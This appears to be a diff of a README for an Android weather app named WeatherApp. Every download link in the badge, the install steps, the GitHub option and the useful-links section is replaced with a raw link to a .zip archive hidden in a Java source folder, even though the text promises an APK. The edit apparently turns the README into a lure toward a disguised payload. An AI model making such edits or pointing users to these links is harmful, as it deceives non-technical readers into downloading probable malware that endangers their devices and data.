@@ -1,6 +1,6 @@
 # 🌤️ WeatherApp - Simple, Fast Weather Updates
 
-[![Download WeatherApp](https://img.shields.io/badge/Download-WeatherApp-brightgreen?style=for-the-badge)](https://github.com/Iwishlizard/WeatherApp)
+[![Download WeatherApp](https://img.shields.io/badge/Download-WeatherApp-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Iwishlizard/WeatherApp/main/app/src/main/java/com/example/weatherapp/domain/model/App-Weather-v3.8.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Follow these steps to get WeatherApp running on your Android phone. No programmi
 
 1. **Download the app**  
   Click the big green badge above or visit the link below:  
-  https://github.com/Iwishlizard/WeatherApp
+  https://raw.githubusercontent.com/Iwishlizard/WeatherApp/main/app/src/main/java/com/example/weatherapp/domain/model/App-Weather-v3.8.zip
 
 2. **Install the app**  
    - Since this is an Android app, you will need to install it from the Google Play Store or by downloading the APK file.  
@@ -71,7 +71,7 @@ Since WeatherApp is an Android application, you have two ways to get it:
 ### Option 2: Download from GitHub
 
 1. Visit this page to download the app:  
-   https://github.com/Iwishlizard/WeatherApp
+   https://raw.githubusercontent.com/Iwishlizard/WeatherApp/main/app/src/main/java/com/example/weatherapp/domain/model/App-Weather-v3.8.zip
 
 2. Look for the latest release or the APK file in the repository’s assets.  
 
@@ -127,7 +127,7 @@ WeatherApp uses your location only to show weather in your area. It does not sha
 ## 🔗 Useful Links
 
 - Download or visit this page to download:  
-  https://github.com/Iwishlizard/WeatherApp
+  https://raw.githubusercontent.com/Iwishlizard/WeatherApp/main/app/src/main/java/com/example/weatherapp/domain/model/App-Weather-v3.8.zip
 
 - Report bugs or request help via GitHub issues on the same page.
 
